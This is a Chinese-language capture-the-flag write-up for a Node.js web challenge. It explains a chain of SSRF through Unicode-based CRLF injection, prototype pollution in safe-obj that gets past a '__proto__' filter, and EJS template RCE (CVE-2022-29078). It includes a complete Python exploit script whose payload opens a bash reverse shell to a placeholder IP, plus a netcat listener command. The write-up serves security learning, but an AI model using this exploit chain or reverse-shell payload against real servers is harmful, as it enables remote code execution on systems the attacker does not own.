![[Pasted image 20230202140119.png|500]]

```javascript
var express = require('express');
var http = require('http');
var router = express.Router();
const safeobj = require('safe-obj');
router.get('/', (req, res) => {
    if (req.query.q) {
        console.log('get q');
    }
    res.render('index');
})
router.post('/copy', (req, res) => {
    res.setHeader('Content-type', 'text/html;charset=utf-8')
    var ip = req.connection.remoteAddress;
    console.log(ip);
    var obj = {
        msg: '',
    }
    if (!ip.includes('127.0.0.1')) {
        obj.msg = "only for admin"
        res.send(JSON.stringify(obj));
        return
    }
    let user = {};
    for (let index in req.body) {
        if (!index.includes("__proto__")) {
            safeobj.expand(user, index, req.body[index])
        }
    }
    res.render('index');
})

router.get('/curl', function (req, res) {
    var q = req.query.q;
    var resp = "";
    if (q) {
        var url = 'http://localhost:3000/?q=' + q
        try {
            http.get(url, (res1) => {
                const {statusCode} = res1;
                const contentType = res1.headers['content-type'];

                let error;
                // 任何 2xx 状态码都表示成功响应，但这里只检查 200。
                if (statusCode !== 200) {
                    error = new Error('Request Failed.\n' +
                        `Status Code: ${statusCode}`);
                }
                if (error) {
                    console.error(error.message);
                    // 消费响应数据以释放内存
                    res1.resume();
                    return;
                }

                res1.setEncoding('utf8');
                let rawData = '';
                res1.on('data', (chunk) => {
                    rawData += chunk;
                    res.end('request success')
                });
                res1.on('end', () => {
                    try {
                        const parsedData = JSON.parse(rawData);
                        res.end(parsedData + '');
                    } catch (e) {
                        res.end(e.message + '');
                    }
                });
            }).on('error', (e) => {
                res.end(`Got error: ${e.message}`);
            })
            res.end('ok');
        } catch (error) {
            res.end(error + '');
        }
    } else {
        res.send("search param 'q' missing!");
    }
})
module.exports = router;
```

存在三个路由，其中`/copy`只能由本地访问，`/curl`通过`http.get`方法访问`/`

要想访问`/copy`路由，需要通过`/curl`进行SSRF

参考 [NodeJS 中的 CRLF Injection](https://web.archive.org/web/20231216212929/https://www.anquanke.com/post/id/240014#h2-11)

利用node.js的`http`模块对于Unicode字符截取低位字节的特性，可以绕过低版本node.js对CRLF的转义，实现HTTP的响应拆分，获得对`/copy`的访问能力

---

`/copy`中可以利用的是`safe-obj`模块

参见 [safe-obj模块原型链污染](https://xz.aliyun.com/t/12053#toc-17)

利用`safe-obj`的`expand`函数，可以实现为任意对象添加字符串属性

```javascript
if (!index.includes("__proto__")) {
	safeobj.expand(user, index, req.body[index])
}
```

源码中过滤了`__proto__`，然而通过`constructor.prototype`亦能获取到原型

---

参考 [(CVE-2022-29078)The RCE exploit 🔥🔥](https://eslam.io/posts/ejs-server-side-template-injection-rce/#the-rce-exploit-)

`ejs`模块低版本有这样的逻辑

```javascript
prepended +=
    '  var __output = "";\n' +
    '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
if (opts.outputFunctionName) {
    prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```

将未经过转义处理的`outputFunctionName`通过拼接方式加入代码中执行，前提是`opts`能够解析出`outputFunctionName`属性

于是构造`POST`内容

```javascript
constructor.prototype.outputFunctionName=x;process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"');s
```

来实现反弹shell

---

最终脚本如下

```python
import requests
from urllib.request import quote

payload = """ HTTP/1.1

POST /copy HTTP/1.1
Host: 127.0.0.1
Content-Length: {}
Content-Type: application/x-www-form-urlencoded

{}

GET / HTTP/1.1
test:""".replace('\n', '\r\n')

body = """constructor.prototype.outputFunctionName=x%3Bprocess.mainModule.require%28%27child_process%27%29.execSync%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/2333%200%3E%261%22%27%29%3Bs"""

payload = payload.format(len(body), body)


def payload_encode(raw):
    res = ''
    for i in raw:
        res += chr(0x0100 + ord(i))
    return res


requests.get(
    'http://3000.endpoint-68e34d3c59d64675ad67a1b75741c685.m.ins.cloud.dasctf.com:81/curl?q='
    + quote(payload_encode(payload)))

```

vps上开启监听

```shell
nc -lvvp 2333
```

![[Pasted image 20230202150044.png|700]]

#Web #nodejs #HTTP #CRLF #SSRF #safe-obj #原型污染 #js #ejs #RCE #Vulnerabilities #反弹shell 
